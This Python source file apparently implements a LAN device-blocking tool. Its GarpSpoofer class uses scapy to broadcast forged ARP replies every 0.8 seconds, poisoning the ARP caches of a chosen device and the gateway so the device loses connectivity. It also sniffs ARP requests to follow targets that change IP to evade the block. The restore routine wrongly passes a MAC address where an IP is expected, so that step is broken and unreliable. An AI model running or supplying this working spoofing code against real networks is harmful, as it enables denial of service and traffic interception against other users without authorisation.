from scapy.all import ARP, Ether, srp, sendp, conf, sniff
from threading import Thread, Lock
from time import time, sleep
from src.ping import get_default_gateway

class GarpSpoofer:
    def __init__(self):
        self.gateway_ip = get_default_gateway()
        self.mac_cache = {} 
        self.gateway_mac = self.resolve_mac(self.gateway_ip)
        self.targets = {}
        self.lock = Lock()
        self.active = True
        conf.verb = 0

        Thread(target=self.monitor_arp, daemon=True).start()
        Thread(target=self.spoof_engine, daemon=True).start()

    def resolve_mac(self, ip):
        now = time()
        cached = self.mac_cache.get(ip)
        if cached and (now - cached['time'] < 30):  
            return cached['mac']
        
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                        timeout=2, verbose=0)
            if ans:
                mac = ans[0][1].hwsrc
                self.mac_cache[ip] = {'mac': mac, 'time': now}
                return mac
        except Exception as e:
            print(f"MAC resolution failed for {ip}: {e}")
        return None

    def craft_garp(self, ip, mac):
        return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/ARP(
            op=2,
            psrc=ip,
            hwsrc=mac,
            pdst=ip
        )

    def monitor_arp(self):
        def arp_handler(pkt):
            if ARP in pkt and pkt[ARP].op == 1:
                with self.lock:
                    for target in self.targets.values():
                        if pkt[ARP].hwsrc == target['real_mac']:
                            new_ip = pkt[ARP].psrc
                            if new_ip == "0.0.0.0":
                                continue
                            if new_ip != target['ip']:
                                print(f"Anti-ARP detected for {target['real_mac']}. New IP: {new_ip}")
                                target['ip'] = new_ip
                                target['last_request'] = time()

        sniff(prn=arp_handler, filter="arp", store=0)

    def spoof_engine(self):
        while self.active:
            with self.lock:
                targets = list(self.targets.values())
            
            packets = []
            for target in targets:
                gw_garp = self.craft_garp(self.gateway_ip, target['spoof_mac'])
                tg_garp = self.craft_garp(target['ip'], self.gateway_mac)
                packets.extend([gw_garp, tg_garp] * 3)

            if packets:
                sendp(packets, verbose=0)
            
            if targets:
                update_time = time()
                for target in targets:
                    target['last_garp'] = update_time

            sleep(0.8) 

    def block_device(self, ip, mac):
        with self.lock:
            if mac in self.targets:
                print(f"Device {mac} already blocked")
                return

            if not self.validate_target(ip, mac):
                return

            self.targets[mac] = {
                'ip': ip,
                'real_mac': mac,
                'spoof_mac': conf.iface.mac,
                'last_garp': 0,
                'last_request': time()
            }
            print(f"Blocking {ip} ({mac})")

    def validate_target(self, ip, mac):
        current_mac = self.resolve_mac(ip)
        if current_mac and current_mac.lower() != mac.lower():
            print(f"MAC mismatch for {ip} (expected {mac}, got {current_mac})")
            return False
        return True

    def restore_device(self, mac):
        with self.lock:
            target = self.targets.pop(mac, None)
            if not target:
                print(f"Device {mac} not found in blocked targets.")
                return

            # Resolve the current IP of the device in case it has changed
            current_ip = self.resolve_mac(target['real_mac'])
            if current_ip and current_ip != target['ip']:
                print(f"IP address for {mac} has changed from {target['ip']} to {current_ip}. Updating...")
                target['ip'] = current_ip

        # Send multiple GARP packets to ensure the device is restored reliably
        real_gw_garp = self.craft_garp(self.gateway_ip, self.gateway_mac)
        real_tg_garp = self.craft_garp(target['ip'], target['real_mac'])

        print(f"Restoring device {target['ip']} ({mac}) with multiple GARP packets...")
        for _ in range(5):  # Send GARP packets multiple times to ensure reliability
            sendp([real_gw_garp, real_tg_garp], verbose=0)
            sleep(0.2)  # Small delay between packets to avoid overwhelming the network

        print(f"Device {target['ip']} ({mac}) restored successfully.")

    def __del__(self):
        self.active = False
        for mac in list(self.targets.keys()):
            self.restore_device(mac)